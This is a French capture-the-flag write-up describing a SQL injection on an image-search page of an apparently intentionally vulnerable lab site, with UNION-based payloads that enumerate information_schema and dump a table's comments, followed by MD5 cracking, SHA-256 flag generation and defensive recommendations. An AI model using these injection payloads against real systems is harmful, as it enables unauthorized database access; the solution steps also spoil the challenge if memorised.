# Récupération de la Clé — Injection SQL sur la page SearchImg

## 🔍 Méthode d'exploitation

Pour ce flag, il faut se rendre sur la page **`/?page=searchimg`**.

On y trouve un formulaire demandant l'**ID d'une image**. En entrant par exemple `1`, on obtient une réponse structurée de cette manière :

```
ID: 1
Title: Nsa
Url : https://fr.wikipedia.org/wiki/Programme_
```

Cette structure typique indique une **requête SQL sous-jacente**, ce qui suggère une vulnérabilité aux **injections SQL**.

---

### Étape 1 — Lister les tables et colonnes

On commence par récupérer toutes les tables et leurs colonnes via la requête suivante :

```sql
1 or 1=1 UNION SELECT table_name, column_name FROM information_schema.columns-- -
```

En ignorant les tables système, on repère la table **`list_images`** et ses colonnes : `id`, `url`, `title`, **`comment`**. C'est cette dernière colonne qui va nous intéresser.

---

### Étape 2 — Extraire les données de la table list_images

On récupère le contenu des colonnes `title` et `comment` :

```sql
1 UNION SELECT title, comment FROM list_images-- -
```

On obtient l'indice suivant dans les résultats :

```
ID: 1
Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
Url : Hack me ?
```

L'indice et le hash MD5 se trouvent directement dans la colonne **`comment`**.

---

### Étape 3 — Décrypter le hash MD5

La valeur `1928e8083cf461a51303633093573c46` est encodée en **MD5**. En la passant dans un décrypteur comme [CrackStation](https://crackstation.net/), on obtient : **`albatroz`**

---

### Étape 4 — Appliquer les transformations et générer le flag

Conformément à l'indice :
1. Passer tous les caractères en **minuscule** → `albatroz`
2. Appliquer un hash **SHA-256** :

```bash
echo -n "albatroz" | sha256sum
```

---

## 🛡️ Recommandations

Pour se protéger contre les injections SQL :

- Utiliser des **requêtes préparées** (prepared statements) avec des paramètres liés
- **Ne jamais insérer directement** les entrées utilisateur dans une requête SQL
- Mettre en place un système de **validation et d'échappement** des entrées
- Limiter les **privilèges de l'utilisateur SQL** au strict nécessaire